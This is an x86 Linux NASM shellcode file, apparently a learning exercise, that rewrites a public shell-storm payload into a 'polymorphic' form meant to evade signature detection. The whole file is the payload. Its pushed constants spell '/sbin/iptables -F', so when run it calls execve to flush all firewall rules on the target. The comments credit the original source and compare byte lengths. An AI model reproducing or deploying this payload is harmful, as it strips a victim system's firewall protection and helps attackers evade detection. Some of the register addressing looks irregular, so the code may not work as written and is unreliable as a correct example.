;Filename: iptables.nasm
;Nasm code obtained from: http://shell-storm.org/shellcode/files/shellcode-825.php
;Polymorphic version author: MrSquid

;Original Lenght: 43 bytes 

;Polymorphic version: 45 bytes

global _start 

section .text

_start:

	;xor eax,eax
	;push eax	
	push ecx
	push word 0x462d
	lea esi,[ebp-34] ;mov esi,esp
	push ecx; push eax
	push dword 0x73656c62
	push dword 0x61747069
	push dword 0x2f6e6962
	push dword 0x732f2f2f
	lea ebx, [esi-20] ;mov ebx,esp
	push ecx; push eax
	push esi
	push ebx
	lea ecx,[ebx-12];mov ecx,esp
	;sub edx,edx
	xor edx,edx ;mov edx,eax
	push 0xb
	pop eax
	;mov al,0xb	
	int 0x80


